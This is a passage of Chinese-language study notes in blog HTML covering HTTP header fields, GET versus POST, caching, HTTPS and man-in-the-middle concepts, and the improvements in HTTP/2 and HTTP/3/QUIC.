src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/HTTP/8-content-length%E5%AD%97%E6%AE%B5.png" alt="img"></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1000</span><br></pre></td></tr></table></figure><p>如上面则是告诉浏览器，本次服务器回应的数据长度是 1000 个字节，后面的字节就属于下一个回应了。</p><p>大家应该都知道 HTTP 是基于 TCP 传输协议进行通信的，而使用了 TCP 传输协议，就会存在一个“粘包”的问题，<strong>HTTP 协议通过设置回车符、换行符作为 HTTP header 的边界，通过 Content-Length 字段作为HTTP body 的边界，这两个方式都是为了解决“粘包”的问题</strong>。</p></li><li><h4 id="Connection-字段"><a href="#Connection-字段" class="headerlink" title="Connection 字段"></a><em>Connection 字段</em></h4><p><code>Connection</code> 字段最常用于客户端要求服务器使用「HTTP 长连接」机制，以便其他请求复用。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/HTTP/9-connection%E5%AD%97%E6%AE%B5.png" alt="img"></p><p>HTTP 长连接的特点是，只要任意一端没有明确提出断开连接，则保持 TCP 连接状态。</p><p><img src="https://cdn.xiaolincoding.com//mysql/other/d2b20d1cc03936332adb2a68512eb167-20230309231005893.png" alt="HTTP 长连接"></p><p>HTTP&#x2F;1.1 版本的默认连接都是长连接，但为了兼容老版本的 HTTP，需要指定 <code>Connection</code> 首部字段的值为 <code>Keep-Alive</code>。</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br></pre></td></tr></table></figure><p>开启了 HTTP Keep-Alive 机制后， 连接就不会中断，而是保持连接。当客户端发送另一个请求时，它会使用同一个连接，一直持续到客户端或服务器端提出断开连接。</p></li><li><h4 id="Content-Type-字段"><a href="#Content-Type-字段" class="headerlink" title="Content-Type 字段"></a><em>Content-Type 字段</em></h4><p><code>Content-Type</code> 字段用于服务器回应时，告诉客户端，本次数据是什么格式。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/HTTP/10-content-type%E5%AD%97%E6%AE%B5.png" alt="img"></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; Charset=utf-8</span><br></pre></td></tr></table></figure><p>上面的类型表明，发送的是网页，而且编码是UTF-8。</p><p>客户端请求的时候，可以使用 <code>Accept</code> 字段声明自己可以接受哪些数据格式。</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br></pre></td></tr></table></figure><p>上面代码中，客户端声明自己可以接受任何格式的数据。</p></li><li><h4 id="Content-Encoding-字段"><a href="#Content-Encoding-字段" class="headerlink" title="Content-Encoding 字段"></a><em>Content-Encoding 字段</em></h4><p><code>Content-Encoding</code> 字段说明数据的压缩方法。表示服务器返回的数据使用了什么压缩格式</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/HTTP/11-content-encoding%E5%AD%97%E6%AE%B5.png" alt="img"></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Encoding</span><span class="punctuation">: </span>gzip</span><br></pre></td></tr></table></figure><p>上面表示服务器返回的数据采用了 gzip 方式压缩，告知客户端需要用此方式解压。</p><p>客户端在请求时，用 <code>Accept-Encoding</code> 字段说明自己可以接受哪些压缩方法。</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br></pre></td></tr></table></figure></li></ol><h2 id="2024-10-20"><a href="#2024-10-20" class="headerlink" title="2024.10.20"></a>2024.10.20</h2><h3 id="GET-与-POST"><a href="#GET-与-POST" class="headerlink" title="GET 与 POST"></a>GET 与 POST</h3><h4 id="GET-和-POST-有什么区别"><a href="#GET-和-POST-有什么区别" class="headerlink" title="GET 和 POST 有什么区别"></a>GET 和 POST 有什么区别</h4><p>根据 RFC 规范，<strong>GET 的语义是从服务器获取指定的资源</strong>，这个资源可以是静态的文本、页面、图片视频等。GET 请求的参数位置一般是写在 URL 中，URL 规定只能支持 ASCII，所以 GET 请求的参数只允许 ASCII 字符 ，而且浏览器会对 URL 的长度有限制（HTTP协议本身对 URL长度并没有做任何规定）。</p><p>根据 RFC 规范，<strong>POST 的语义是根据请求负荷（报文body）对指定的资源做出处理</strong>，具体的处理方式视资源类型而不同。POST 请求携带数据的位置一般是写在报文 body 中，body 中的数据可以是任意格式的数据，只要客户端与服务端协商好即可，而且浏览器不会对 body 大小做限制。</p><h4 id="GET-和-POST-方法都是安全和幂等的吗？"><a href="#GET-和-POST-方法都是安全和幂等的吗？" class="headerlink" title="GET 和 POST 方法都是安全和幂等的吗？"></a>GET 和 POST 方法都是安全和幂等的吗？</h4><p>说明下安全和幂等的概念：</p><ul><li>在 HTTP 协议里，所谓的「安全」是指请求方法不会「破坏」服务器上的资源。</li><li>所谓的「幂等」，意思是多次执行相同的操作，结果都是「相同」的。</li></ul><p>从 RFC 规范定义的语义来看：</p><ul><li><strong>GET 方法就是安全且幂等的</strong>，因为它是「只读」操作，无论操作多少次，服务器上的数据都是安全的，且每次的结果都是相同的。所以，<strong>可以对 GET 请求的数据做缓存，这个缓存可以做到浏览器本身上（彻底避免浏览器发请求），也可以做到代理上（如nginx），而且在浏览器中 GET 请求可以保存为书签</strong>。</li><li><strong>POST</strong> 因为是「新增或提交数据」的操作，会修改服务器上的资源，所以是<strong>不安全</strong>的，且多次提交数据就会创建多个资源，所以<strong>不是幂等</strong>的。所以，<strong>浏览器一般不会缓存 POST 请求，也不能把 POST 请求保存为书签</strong>。</li></ul><p>小结：</p><p>GET 的语义是请求获取指定的资源。GET 方法是安全、幂等、可被缓存的。</p><p>POST 的语义是根据请求负荷（报文主体）对指定的资源做出处理，具体的处理方式视资源类型而不同。POST 不安全，不幂等，大部分实现）不可缓存。</p><p>上面是从 RFC 规范定义的语义来分析的。</p><p>但是实际过程中，开发者不一定会按照 RFC 规范定义的语义来实现 GET 和 POST 方法。比如：</p><ul><li>可以用 GET 方法实现新增或删除数据的请求，这样实现的 GET 方法自然就不是安全和幂等。</li><li>可以用 POST 方法实现查询数据的请求，这样实现的 POST 方法自然就是安全和幂等。</li></ul><h2 id="2024-10-27"><a href="#2024-10-27" class="headerlink" title="2024.10.27"></a>2024.10.27</h2><h3 id="HTTP缓存技术"><a href="#HTTP缓存技术" class="headerlink" title="HTTP缓存技术"></a>HTTP缓存技术</h3><p>HTTP 缓存有两种实现方式，分别是<strong>强制缓存和协商缓存</strong>。</p><h4 id="强制缓存"><a href="#强制缓存" class="headerlink" title="强制缓存"></a>强制缓存</h4><p>强缓存指的是只要浏览器判断缓存没有过期，则直接使用浏览器的本地缓存，决定是否使用缓存的主动性在于浏览器这边。</p><p>强缓存是利用下面这两个 HTTP 响应头部字段实现的，它们都用来表示资源在客户端缓存的有效期：</p><ul><li><code>Cache-Control</code>， 是一个相对时间；</li><li><code>Expires</code>，是一个绝对时间；</li></ul><p>如果 HTTP 响应头部同时有 Cache-Control 和 Expires 字段的话，<strong>Cache-Control 的优先级高于 Expires</strong> 。</p><p>使用 Cache-Control 来实现强缓存。具体的实现流程如下：</p><ul><li>当浏览器第一次请求访问服务器资源时，服务器会在返回这个资源的同时，在 Response 头部加上 Cache-Control，Cache-Control 中设置了过期时间大小；</li><li>浏览器再次请求访问服务器中的该资源时，会先<strong>通过请求资源的时间与 Cache-Control 中设置的过期时间大小，来计算出该资源是否过期</strong>，如果没有，则使用该缓存，否则重新请求服务器；</li><li>服务器再次收到请求后，会再次更新 Response 头部的 Cache-Control。</li></ul><h4 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h4><p>请求的响应码是 <code>304</code>，这个是告诉浏览器可以使用本地缓存的资源，通常这种通过服务端告知客户端是否可以使用缓存的方式被称为协商缓存。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost4@main/%E7%BD%91%E7%BB%9C/http1.1%E4%BC%98%E5%8C%96/%E7%BC%93%E5%AD%98etag.png" alt="img"></p><p><strong>协商缓存就是与服务端协商之后，通过协商结果来判断是否使用本地缓存</strong>。</p><p>协商缓存可以基于两种头部来实现。</p><p>第一种：请求头部中的 <code>If-Modified-Since</code> 字段与响应头部中的 <code>Last-Modified</code> 字段实现，这两个字段的意思是：</p><ul><li>响应头部中的 <code>Last-Modified</code>：标示这个响应资源的最后修改时间；</li><li>请求头部中的 <code>If-Modified-Since</code>：当资源过期了，发现响应头中具有 Last-Modified 声明，则再次发起请求的时候带上 Last-Modified 的时间，服务器收到请求后发现有 If-Modified-Since 则与被请求资源的最后修改时间进行对比（Last-Modified），如果最后修改时间较新（大），说明资源又被改过，则返回最新资源，HTTP 200 OK；如果最后修改时间较旧（小），说明资源无新修改，响应 HTTP 304 走缓存。</li></ul><p>第二种：请求头部中的 <code>If-None-Match</code> 字段与响应头部中的 <code>ETag</code> 字段，这两个字段的意思是：</p><ul><li>响应头部中 <code>Etag</code>：唯一标识响应资源；</li><li>请求头部中的 <code>If-None-Match</code>：当资源过期时，浏览器发现响应头里有 Etag，则再次向服务器发起请求时，会将请求头 If-None-Match 值设置为 Etag 的值。服务器收到请求后进行比对，如果资源没有变化返回 304，如果资源变化了返回 200。</li></ul><p>第一种实现方式是基于时间实现的，第二种实现方式是基于一个唯一标识实现的，相对来说后者可以更加准确地判断文件内容是否被修改，避免由于时间篡改导致的不可靠问题。</p><p>注意，<strong>协商缓存这两个字段都需要配合强制缓存中 Cache-Control 字段来使用，只有在未能命中强制缓存的时候，才能发起带有协商缓存字段的请求</strong>。</p><p>下图是强制缓存和协商缓存的工作流程：</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/network/http/http%E7%BC%93%E5%AD%98.png" alt="img"></p><h3 id="HTTP特性"><a href="#HTTP特性" class="headerlink" title="HTTP特性"></a>HTTP特性</h3><h4 id="HTTP-1-1的优点有哪些？"><a href="#HTTP-1-1的优点有哪些？" class="headerlink" title="HTTP&#x2F;1.1的优点有哪些？"></a>HTTP&#x2F;1.1的优点有哪些？</h4><ol><li><em><strong>简单</strong></em></li></ol><p>   HTTP 基本的报文格式就是 <code>header + body</code>，头部信息也是 <code>key-value</code> 简单文本的形式，<strong>易于理解</strong>，降低了学习和使用的门槛。</p><ol start="2"><li><p><em><strong>灵活和易于扩展</strong></em></p><p>HTTP 协议里的各类请求方法、URI&#x2F;URL、状态码、头字段等每个组成要求都没有被固定死，都允许开发人员<strong>自定义和扩充</strong>。</p><p>同时 HTTP 由于是工作在应用层（ <code>OSI</code> 第七层），则它<strong>下层可以随意变化</strong>，比如：</p><ul><li><p>HTTPS 就是在 HTTP 与 TCP 层之间增加了 SSL&#x2F;TLS 安全传输层；</p></li><li><p>HTTP&#x2F;1.1 和 HTTP&#x2F;2.0 传输协议使用的是 TCP 协议，而到了 HTTP&#x2F;3.0 传输协议改用了 UDP 协议。</p></li></ul></li><li><p><em><strong>应用广泛和跨平台</strong></em></p></li></ol><h4 id="HTTP-1-1-的缺点有哪些？"><a href="#HTTP-1-1-的缺点有哪些？" class="headerlink" title="HTTP&#x2F;1.1 的缺点有哪些？"></a>HTTP&#x2F;1.1 的缺点有哪些？</h4><ol><li><p><em><strong>无状态双刃剑</strong></em></p><p>无状态的<strong>好处</strong>，因为服务器不会去记忆 HTTP 的状态，所以不需要额外的资源来记录状态信息，这能减轻服务器的负担，能够把更多的 CPU 和内存用来对外提供服务。</p><p>无状态的<strong>坏处</strong>，既然服务器没有记忆能力，它在完成有关联性的操作时会非常麻烦。</p><p>例如登录-&gt;添加购物车-&gt;下单-&gt;结算-&gt;支付，这系列操作都要知道用户的身份才行。但服务器不知道这些请求是有关联的，每次都要问一遍身份信息。</p><p>对于无状态的问题，解法方案有很多种，其中比较简单的方式用 <strong>Cookie</strong> 技术。</p><p><code>Cookie</code> 通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态。</p><p>相当于，<strong>在客户端第一次请求后，服务器会下发一个装有客户信息的「小贴纸」，后续客户端请求服务器的时候，带上「小贴纸」，服务器就能认得了了</strong>，</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/HTTP/14-cookie%E6%8A%80%E6%9C%AF.png" alt="Cookie 技术"></p></li><li><p><em><strong>明文传输双刃剑</strong></em></p><p>HTTP 的所有信息都暴露在了光天化日下，相当于<strong>信息裸奔</strong>。在传输的漫长的过程中，信息的内容都毫无隐私可言，很容易就能被窃取，如果里面有你的账号密码信息，那<strong>你号没了</strong>。</p></li><li><p><em><strong>不安全</strong></em></p><p>HTTP 比较严重的缺点就是不安全：</p><ul><li>通信使用明文（不加密），内容可能会被窃听。</li><li>不验证通信方的身份，因此有可能遭遇伪装。</li><li>无法证明报文的完整性，所以有可能已遭篡改。</li></ul></li></ol><p>HTTP 的安全问题，可以用 HTTPS 的方式解决，也就是通过引入 SSL&#x2F;TLS 层，使得在安全上达到了极致。</p><h4 id="HTTP-1-1-的性能如何？"><a href="#HTTP-1-1-的性能如何？" class="headerlink" title="HTTP&#x2F;1.1 的性能如何？"></a>HTTP&#x2F;1.1 的性能如何？</h4><p>HTTP 协议是基于 <strong>TCP&#x2F;IP</strong>，并且使用了「<strong>请求 - 应答</strong>」的通信模式，所以性能的关键就在这<strong>两点</strong>里。</p><ol><li><p><em><strong>长连接</strong></em></p><p>早期 HTTP&#x2F;1.0 性能上的一个很大的问题，那就是每发起一个请求，都要新建一次 TCP 连接（三次握手），而且是串行请求，做了无谓的 TCP 连接建立和断开，增加了通信开销。</p><p>为了解决上述 TCP 连接问题，HTTP&#x2F;1.1 提出了<strong>长连接</strong>的通信方式，也叫持久连接。这种方式的好处在于减少了 TCP 连接的重复建立和断开所造成的额外开销，减轻了服务器端的负载。</p><p>持久连接的特点是，只要任意一端没有明确提出断开连接，则保持 TCP 连接状态。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/HTTP/16-%E7%9F%AD%E8%BF%9E%E6%8E%A5%E4%B8%8E%E9%95%BF%E8%BF%9E%E6%8E%A5.png" alt="短连接与长连接"></p><p>如果某个 HTTP 长连接超过一定时间没有任何数据交互，服务端就会主动断开这个连接。</p></li><li><p><em><strong>管道网络传输</strong></em></p><p>HTTP&#x2F;1.1 采用了长连接的方式，这使得管道（pipeline）网络传输成为了可能。</p><p>即可在同一个 TCP 连接里面，客户端可以发起多个请求，只要第一个请求发出去了，不必等其回来，就可以发第二个请求出去，可以<strong>减少整体的响应时间。</strong></p><p>但是<strong>服务器必须按照接收请求的顺序发送对这些管道化请求的响应</strong>。</p><p>如果服务端在处理 A 请求时耗时比较长，那么后续的请求的处理都会被阻塞住，这称为「队头堵塞」。</p><p>所以，<strong>HTTP&#x2F;1.1 管道解决了请求的队头阻塞，但是没有解决响应的队头阻塞</strong>。</p></li><li><p><em><strong>队头阻塞</strong></em></p><p>「请求 - 应答」的模式会造成 HTTP 的性能问题。</p><p>因为当顺序发送的请求序列中的一个请求因为某种原因被阻塞时，在后面排队的所有请求也一同被阻塞了，会招致客户端一直请求不到数据，这也就是「<strong>队头阻塞</strong>」，好比上班的路上塞车。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/HTTP/18-%E9%98%9F%E5%A4%B4%E9%98%BB%E5%A1%9E.png" alt="队头阻塞"></p></li></ol><h3 id="HTTP与HTTPS"><a href="#HTTP与HTTPS" class="headerlink" title="HTTP与HTTPS"></a>HTTP与HTTPS</h3><h4 id="HTTP与HTTPS有哪些区别"><a href="#HTTP与HTTPS有哪些区别" class="headerlink" title="HTTP与HTTPS有哪些区别"></a>HTTP与HTTPS有哪些区别</h4><ul><li><p>HTTP 是超文本传输协议，信息是明文传输，存在安全风险的问题。</p><p>HTTPS 则解决 HTTP 不安全的缺陷，在 TCP 和 HTTP 网络层之间加入了 SSL&#x2F;TLS 安全协议，使得报文能够加密传输。</p></li><li><p>HTTP 连接建立相对简单， TCP 三次握手之后便可进行 HTTP 的报文传输。而 HTTPS 在 TCP 三次握手之后，还需进行 SSL&#x2F;TLS 的握手过程，才可进入加密报文传输。</p></li><li><p>两者的默认端口不一样，HTTP 默认端口号是 80，HTTPS 默认端口号是 443。</p></li><li><p>HTTPS 协议需要向 CA（证书权威机构）申请数字证书，来保证服务器的身份是可信的。</p></li></ul><h3 id="HTTPS-是如何建立连接的？其间交互了什么？"><a href="#HTTPS-是如何建立连接的？其间交互了什么？" class="headerlink" title="HTTPS 是如何建立连接的？其间交互了什么？"></a>HTTPS 是如何建立连接的？其间交互了什么？</h3><p>SSL&#x2F;TLS 协议基本流程：</p><ul><li>客户端向服务器索要并验证服务器的公钥。</li><li>双方协商生产「会话秘钥」。</li><li>双方采用「会话秘钥」进行加密通信。</li></ul><p>前两步也就是 SSL&#x2F;TLS 的建立过程，也就是 TLS 握手阶段。</p><p>TLS 的「握手阶段」涉及<strong>四次</strong>通信，使用不同的密钥交换算法，TLS 握手流程也会不一样的，现在常用的密钥交换算法有两种：<a href="https://xiaolincoding.com/network/2_http/https_rsa.html">RSA 算法 </a>和 <a href="https://xiaolincoding.com/network/2_http/https_ecdhe.html">ECDHE 算法 </a>。</p><h2 id="2024-11-2"><a href="#2024-11-2" class="headerlink" title="2024.11.2"></a>2024.11.2</h2><h3 id="HTTPS-一定安全可靠吗？"><a href="#HTTPS-一定安全可靠吗？" class="headerlink" title="HTTPS 一定安全可靠吗？"></a>HTTPS 一定安全可靠吗？</h3><p>这个问题的场景是这样的：客户端通过浏览器向服务端发起 HTTPS 请求时，被「假基站」转发到了一个「中间人服务器」，于是客户端是和「中间人服务器」完成了 TLS 握手，然后这个「中间人服务器」再与真正的服务端完成 TLS 握手。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/network/http/https%E4%B8%AD%E9%97%B4%E4%BA%BA.drawio.png" alt="img"></p><p>从客户端的角度看，其实并不知道网络中存在中间人服务器这个角色。那么中间人就可以解开浏览器发起的 HTTPS 请求里的数据，也可以解开服务端响应给浏览器的 HTTPS 响应数据。相当于，中间人能够 “偷看” 浏览器与服务端之间的 HTTPS 请求和响应的数据。</p><p>但是要发生这种场景是有前提的，前提是用户点击接受了中间人服务器的证书。</p><p>中间人服务器与客户端在 TLS 握手过程中，实际上发送了自己伪造的证书给浏览器，而这个伪造的证书是能被浏览器（客户端）识别出是非法的，于是就会提醒用户该证书存在问题。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/network/http/%E8%AF%81%E4%B9%A6%E5%AE%89%E5%85%A8%E6%8F%90%E7%A4%BA.png" alt="img"></p><p>如果用户执意点击「继续浏览此网站」，相当于用户接受了中间人伪造的证书，那么后续整个 HTTPS 通信都能被中间人监听了。</p><p>所以，这其实并不能说 HTTPS 不够安全，毕竟浏览器都已经提示证书有问题了。</p><p>另外，如果你的电脑中毒了，被恶意导入了中间人的根证书，那么在验证中间人的证书的时候，由于你操作系统信任了中间人的根证书，那么等同于中间人的证书是合法的，这种情况下，浏览器是不会弹出证书存在问题的风险提醒的。</p><p>所以，<strong>HTTPS 协议本身到目前为止还是没有任何漏洞的，即使你成功进行中间人攻击，本质上是利用了客户端的漏洞（用户点击继续访问或者被恶意导入伪造的根证书），并不是 HTTPS 不够安全</strong>。</p><h3 id="HTTP-1-1、HTTP-2、HTTP-3-演变"><a href="#HTTP-1-1、HTTP-2、HTTP-3-演变" class="headerlink" title="HTTP&#x2F;1.1、HTTP&#x2F;2、HTTP&#x2F;3 演变"></a>HTTP&#x2F;1.1、HTTP&#x2F;2、HTTP&#x2F;3 演变</h3><h4 id="HTTP-1-1-相比-HTTP-1-0-提高了什么性能？"><a href="#HTTP-1-1-相比-HTTP-1-0-提高了什么性能？" class="headerlink" title="HTTP&#x2F;1.1 相比 HTTP&#x2F;1.0 提高了什么性能？"></a>HTTP&#x2F;1.1 相比 HTTP&#x2F;1.0 提高了什么性能？</h4><p><strong>HTTP&#x2F;1.1 相比 HTTP&#x2F;1.0 性能上的改进：</strong></p><ul><li>使用长连接的方式改善了 HTTP&#x2F;1.0 短连接造成的性能开销。</li><li>支持管道（pipeline）网络传输，只要第一个请求发出去了，不必等其回来，就可以发第二个请求出去，可以减少整体的响应时间。</li></ul><p><strong>但 HTTP&#x2F;1.1 还是有性能瓶颈：</strong></p><ul><li><p>请求 &#x2F; 响应头部（Header）未经压缩就发送，首部信息越多延迟越大。只能压缩 <code>Body</code> 的部分；</p></li><li><p>发送冗长的首部。每次互相发送相同的首部造成的浪费较多；</p></li><li><p>服务器是按请求的顺序响应的，如果服务器响应慢，会招致客户端一直请求不到数据，也就是队头阻塞；</p></li><li><p>没有请求优先级控制；</p></li><li><p>请求只能从客户端开始，服务器只能被动响应。</p></li></ul><h4 id="HTTP-2-做了什么优化？"><a href="#HTTP-2-做了什么优化？" class="headerlink" title="HTTP&#x2F;2 做了什么优化？"></a>HTTP&#x2F;2 做了什么优化？</h4><p>HTTP&#x2F;2 协议是基于 HTTPS 的，所以 HTTP&#x2F;2 的安全性也是有保障的。</p><p>那 HTTP&#x2F;2 相比 HTTP&#x2F;1.1 性能上的改进：</p><ul><li>头部压缩</li><li>二进制格式</li><li>并发传输</li><li>服务器主动推送资源</li></ul><ol><li><p><em><strong>头部压缩</strong></em></p><p>HTTP&#x2F;2 会<strong>压缩头</strong>（Header）如果你同时发出多个请求，他们的头是一样的或是相似的，那么，协议会帮你<strong>消除重复的部分</strong>。</p><p>这就是所谓的 <code>HPACK</code> 算法：在客户端和服务器同时维护一张头信息表，所有字段都会存入这个表，生成一个索引号，以后就不发送同样字段了，只发送索引号，这样就<strong>提高速度</strong>了。</p></li><li><p><em><strong>二进制格式</strong></em></p><p>HTTP&#x2F;2 不再像 HTTP&#x2F;1.1 里的纯文本形式的报文，而是全面采用了<strong>二进制格式</strong>，头信息和数据体都是二进制，并且统称为帧（frame）：<strong>头信息帧（Headers Frame）和数据帧（Data Frame）</strong>。</p><p>那么收到报文后，无需再将明文的报文转成二进制，而是直接解析二进制报文，这<strong>增加了数据传输的效率</strong>。</p></li><li><p><em><strong>并发传输</strong></em></p><p>我们都知道 HTTP&#x2F;1.1 的实现是基于请求-响应模型的。同一个连接中，HTTP 完成一个事务（请求与响应），才能处理下一个事务，也就是说在发出请求等待响应的过程中，是没办法做其他事情的，如果响应迟迟不来，那么后续的请求是无法发送的，也造成了<strong>队头阻塞</strong>的问题。</p><p>而 HTTP&#x2F;2 就很牛逼了，引出了 Stream 概念，多个 Stream 复用在一条 TCP连接。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost4@main/%E7%BD%91%E7%BB%9C/http2/stream.png" alt="img"></p><p><strong>针对不同的 HTTP 请求用独一无二的 Stream ID 来区分，接收端可以通过Stream ID 有序组装成 HTTP 消息，不同 Stream 的帧是可以乱序发送的，因此可以并发不同的 Stream ，也就是 HTTP&#x2F;2 可以并行交错地发送请求和响应</strong>。</p></li><li><p><em><strong>服务器推送</strong></em></p><p>HTTP&#x2F;2 还在一定程度上改善了传统的「请求 - 应答」工作模式，服务端不再是被动地响应，可以<strong>主动</strong>向客户端发送消息。</p><p>客户端和服务器<strong>双方都可以建立 Stream</strong>， Stream ID 也是有区别的，客户端建立的 Stream 必须是奇数号，而服务器建立的 Stream 必须是偶数号。</p></li></ol><blockquote><p>HTTP&#x2F;2 有什么缺陷？</p></blockquote><p>HTTP&#x2F;2 通过 Stream 的并发能力，解决了 HTTP&#x2F;1 队头阻塞的问题，看似很完美了，但是 HTTP&#x2F;2 还是存在“队头阻塞”的问题，只不过问题不是在 HTTP这一层面，而是在 TCP 这一层。</p><p><strong>HTTP&#x2F;2 是基于 TCP 协议来传输数据的，TCP 是字节流协议，TCP 层必须保证收到的字节数据是完整且连续的，这样内核才会将缓冲区里的数据返回给HTTP 应用，那么当「前 1 个字节数据」没有到达时，后收到的字节数据只能存放在内核缓冲区里，只有等到这 1 个字节数据到达时，HTTP&#x2F;2 应用层才能从内核中拿到数据，这就是 HTTP&#x2F;2 队头阻塞问题。</strong></p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/network/quic/http2%E9%98%BB%E5%A1%9E.jpeg" alt="img"></p><h4 id="HTTP-3-做了哪些优化？"><a href="#HTTP-3-做了哪些优化？" class="headerlink" title="HTTP&#x2F;3 做了哪些优化？"></a>HTTP&#x2F;3 做了哪些优化？</h4><p>前面我们知道了 HTTP&#x2F;1.1 和 HTTP&#x2F;2 都有队头阻塞的问题：</p><ul><li>HTTP&#x2F;1.1 中的管道（ pipeline）虽然解决了请求的队头阻塞，但是<strong>没有解决响应的队头阻塞</strong>，因为服务端需要按顺序响应收到的请求，如果服务端处理某个请求消耗的时间比较长，那么只能等响应完这个请求后， 才能处理下一个请求，这属于 HTTP 层队头阻塞。</li><li>HTTP&#x2F;2 虽然通过多个请求复用一个 TCP 连接解决了 HTTP 的队头阻塞 ，但是<strong>一旦发生丢包，就会阻塞住所有的 HTTP 请求</strong>，这属于 TCP 层队头阻塞。</li></ul><p>HTTP&#x2F;2 队头阻塞的问题是因为 TCP，所以 <strong>HTTP&#x2F;3 把 HTTP 下层的 TCP 协议改成了 UDP！</strong></p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/HTTP/27-HTTP3.png" alt="HTTP/1 ~ HTTP/3"></p><p>UDP 发送是不管顺序，也不管丢包的，所以不会出现像 HTTP&#x2F;2 队头阻塞的问题。大家都知道 UDP 是不可靠传输的，但基于 UDP 的 <strong>QUIC 协议</strong> 可以实现类似 TCP 的可靠性传输。</p><p>QUIC 有以下 3 个特点。</p><ul><li>无队头阻塞</li><li>更快的连接建立</li><li>连接迁移</li></ul><ol><li><p><em><strong>无队头阻塞</strong></em></p><p>QUIC 协议也有类似 HTTP&#x2F;2 Stream 与多路复用的概念，也是可以在同一条连接上并发传输多个 Stream，Stream 可以认为就是一条 HTTP 请求。</p><p>QUIC 有自己的一套机制可以保证传输的可靠性的。<strong>当某个流发生丢包时，只会阻塞这个流，其他流不会受到影响，因此不存在队头阻塞问题</strong>。这与HTTP&#x2F;2 不同，HTTP&#x2F;2 只要某个流中的数据包丢失了，其他流也会因此受影响。</p><p>所以，QUIC 连接上的多个 Stream 之间并没有依赖，都是独立的，某个流发生丢包了，只会影响该流，其他流不受影响。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/network/quic/quic%E6%97%A0%E9%98%BB%E5%A1%9E.jpeg" alt="img"></p></li><li><p><em><strong>更快的连接建立</strong></em></p><p>对于 HTTP&#x2F;1 和 HTTP&#x2F;2 协议，TCP 和 TLS 是分层的，分别属于内核实现的传输层、openssl 库实现的表示层，因此它们难以合并在一起，需要分批次来握手，先 TCP 握手，再 TLS 握手。</p><p>HTTP&#x2F;3 在传输数据前虽然需要 QUIC 协议握手，但是这个握手过程只需要 1RTT，握手的目的是为确认双方的「连接 ID」，连接迁移就是基于连接 ID实现的。</p><p>但是 HTTP&#x2F;3 的 QUIC 协议并不是与 TLS 分层，而是 QUIC 内部包含了TLS，它在自己的帧会携带 TLS 里的“记录”，再加上 QUIC 使用的是TLS&#x2F;1.3，因此仅需 1 个 RTT 就可以「同时」完成建立连接与密钥协商。</p><p><img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/ImageHost/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/HTTP/28-HTTP3%E4%BA%A4%E4%BA%92%E6%AC%A1%E6%95%B0.png" alt="TCP HTTPS（TLS/1.3） 和 QUIC HTTPS "></p><p>甚至，在第二次连接的时候，应用数据包可以和 QUIC 握手信息（连接信息+ TLS 信息）一起发送，达到 0-RTT 的效果。</p><p>如下图右边部分，HTTP&#x2F;3 当会话恢复时，有效负载数据与第一个数据包一起发送，可以做到 0-RTT（下图的右下角）：</p><p><img src="https://cdn.xiaolincoding.com//mysql/other/4cad213f5125432693e0e2a512c2d1a1-20230309231022316.png" alt="img"></p></li><li><p><em><strong>连接迁移</strong></em></p><p>基于 TCP 传输协议的 HTTP 协议，由于是通过四元组（源 IP、源端口、目的IP、目的端口）确定一条 TCP 连接。</p><p><img src="https://cdn.xiaolincoding.com//mysql/other/format,png-20230309231026577.png" alt="TCP 四元组"></p><p>那么<strong>当移动设备的网络从 4G 切换到 WIFI 时，意味着 IP 地址变化了，那么就必须要断开连接，然后重新建立连接</strong>。而建立连接的过程包含 TCP 三次握手和 TLS 四次握手的时延，以及 TCP 慢启动的减速过程，给用户的感觉就是网络突然卡顿了一下，因此连接的迁移成本是很高的。</p><p>而 QUIC 协议没有用四元组的方式来“绑定”连接，而是通过<strong>连接 ID</strong> 来标记通信的两个端点，客户端和服务器可以各自选择一组 ID 来标记自己，因此即使移动设备的网络变化后，导致 IP 地址变化了，只要仍保有上下文信息（比如连接 ID、TLS 